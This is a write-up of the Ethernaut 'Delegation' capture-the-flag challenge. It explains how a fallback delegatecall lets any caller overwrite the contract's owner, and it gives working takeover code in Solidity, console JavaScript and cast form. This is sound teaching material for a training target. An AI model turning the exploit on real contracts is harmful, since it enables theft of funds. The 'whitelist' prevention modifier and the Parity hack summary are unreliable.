# Ethernaut #06 — Delegation

**Vulnerability:** Delegatecall Context Injection  
**Difficulty:** Medium  
**Concept:** `delegatecall` executes code in the *caller's* context, preserving `msg.sender` and storage layout

## The Challenge

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external payable {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## The Vulnerability

**`delegatecall` is dangerous because:**
1. Executes target code in the **caller's storage context**
2. `msg.sender` remains the **original caller**
3. Storage slots map 1:1 between contracts

**The Exploit Path:**
```
Attacker -> Delegation.fallback() -> delegatecall(Delegate.pwn())
                                         |
                                         v
                              Executes: owner = msg.sender
                              Context:  Delegation's storage slot 0
                              Result:   Delegation.owner = attacker
```

## Storage Layout Collision

| Slot | Delegate Contract | Delegation Contract |
|------|-------------------|---------------------|
| 0    | `address owner`   | `address owner`     |
| 1    | (empty)           | `Delegate delegate` |

When `Delegate.pwn()` executes via `delegatecall`:
- `owner = msg.sender` writes to **slot 0** of `Delegation`
- Same slot = overwritten!

## The Exploit

```solidity
// Calculate function selector for pwn()
bytes4 selector = bytes4(keccak256("pwn()"));
// = 0xdd365b8b

// Call Delegation with this data
(bool success,) = address(delegation).call(abi.encodeWithSelector(selector));
```

**JavaScript (Ethernaut console):**
```javascript
// Get the selector
const data = web3.eth.abi.encodeFunctionSignature("pwn()")
// "0xdd365b8b"

// Send the transaction
await contract.sendTransaction({data: data})
```

**Cast (CLI):**
```bash
cast send <DELEGATION_ADDR> "0xdd365b8b" --private-key $PK
```

## Key Takeaways

1. **`delegatecall` is a sharp knife** — use with extreme caution
2. **Storage layout must match exactly** between caller and target
3. **Never delegatecall to untrusted contracts**
4. **The `fallback` function accepting arbitrary calls** is the entry point

## Real-World Parallels

- **Parity Multisig Hack (2017):** $30M lost — delegatecall to attacker-controlled library
- **Pattern:** Library pattern gone wrong when library self-destructed

## Prevention

```solidity
// ✅ Use libraries with internal functions (no delegatecall)
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        return a + b;
    }
}

// ✅ If using delegatecall, whitelist targets
mapping(address => bool) public allowedDelegates;

modifier onlyAllowedDelegate() {
    require(allowedDelegates[msg.sender], "Not allowed");
    _;
}

// ✅ Use OpenZeppelin's proxy patterns (extensively audited)
```

## Gas-Optimized PoC (Sepolia-ready)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Exploit {
    function attack(address delegation) external {
        (bool s,) = delegation.call(hex"dd365b8b");
        require(s, "failed");
    }
}
```

**Deployment cost:** ~30k gas  
**Execution cost:** ~25k gas  
**Total:** ~$1-2 on Sepolia

---

**Status:** ✅ Exploit documented, ready for execution  
**Next:** Ethernaut #07 — Force
